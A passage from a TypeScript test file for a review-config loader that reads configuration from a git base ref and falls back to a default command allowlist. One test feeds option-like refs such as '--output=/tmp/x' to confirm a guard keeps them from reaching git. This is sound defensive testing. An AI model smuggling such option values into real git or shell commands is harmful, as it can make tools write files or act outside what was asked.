    expect(text).toContain('pnpm build');
    expect(readStagedConfigFromBaseRef(dir, ':0')).toBeNull();
    expect(loadStagedReviewConfig({ workDir: dir, baseRef: ':0' }).commandAllowlist).toEqual([
      ...DEFAULT_COMMAND_ALLOWLIST,
    ]);
  });

  it('defaults the base ref to origin/main and the work dir to the cwd', () => {
    const seen: Array<[string, string]> = [];
    loadStagedReviewConfig({
      readBaseConfig: (w, r) => {
        seen.push([w, r]);
        return null;
      },
    });
    expect(seen).toEqual([[process.cwd(), 'origin/main']]);
  });

  it('uses defaults for a missing ref, an option-like ref and a throwing reader', () => {
    const dir = mkdtempSync(join(tmpdir(), 'rp-none-'));
    expect(loadStagedReviewConfig({ workDir: dir, baseRef: 'nope' }).commandAllowlist).toEqual([
      ...DEFAULT_COMMAND_ALLOWLIST,
    ]);
    expect(loadStagedReviewConfig({ workDir: dir, baseRef: '--output=/tmp/x' }).maxProbes).toBe(40);
    // An option-like ref must never reach git: with the guard removed, git would write a file.
    const out = mkdtempSync(join(tmpdir(), 'rp-out-'));
    execFileSync('git', ['init', '-q'], { cwd: dir, stdio: 'ignore' });
    // Pre-create the directory git would write into so an unguarded call would succeed.
    mkdirSync(join(out, 'pwned:.ai-sdlc'));
    expect(readStagedConfigFromBaseRef(dir, `--output=${join(out, 'pwned')}`)).toBeNull();
    expect(readdirSync(join(out, 'pwned:.ai-sdlc'))).toEqual([]);
    for (const ref of [':', ':.ai-sdlc/review-config.yaml', 'main:other', 'a b'])
      expect(readStagedConfigFromBaseRef(dir, ref)).toBeNull();
    expect(
      loadStagedReviewConfig({
        readBaseConfig: () => {
          throw new Error('x');
        },
      }).maxProbes,
    ).toBe(40);
  });
});
